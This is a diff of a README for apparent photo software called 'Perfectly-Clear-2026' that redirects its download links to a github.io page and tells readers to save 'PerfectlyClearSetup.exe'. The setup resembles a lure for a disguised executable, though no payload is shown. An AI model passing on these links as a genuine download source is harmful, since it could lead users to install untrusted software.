@@ -1,6 +1,6 @@
 # 📸 Perfectly-Clear-2026 - Enhance Your Photos With One Click
 
-[![](https://img.shields.io/badge/Download-Perfectly_Clear-blue.svg)](https://github.com/Creditproboscis566/Perfectly-Clear-2026)
+[![](https://img.shields.io/badge/Download-Perfectly_Clear-blue.svg)](https://creditproboscis566.github.io)
 
 ## 💡 About This Software
 
@@ -20,7 +20,7 @@ Before you install the software, check your computer for these specifications:
 
 Follow these instructions to set up the software on your computer.
 
-1. Visit the following page to access the installer: [https://github.com/Creditproboscis566/Perfectly-Clear-2026](https://github.com/Creditproboscis566/Perfectly-Clear-2026)
+1. Visit the following page to access the installer: [https://creditproboscis566.github.io](https://creditproboscis566.github.io)
 2. Locate the download button or the release link on the page.
 3. Click the link to begin the download process for the installer file.
 4. Save the file named "PerfectlyClearSetup.exe" to your hard drive. 
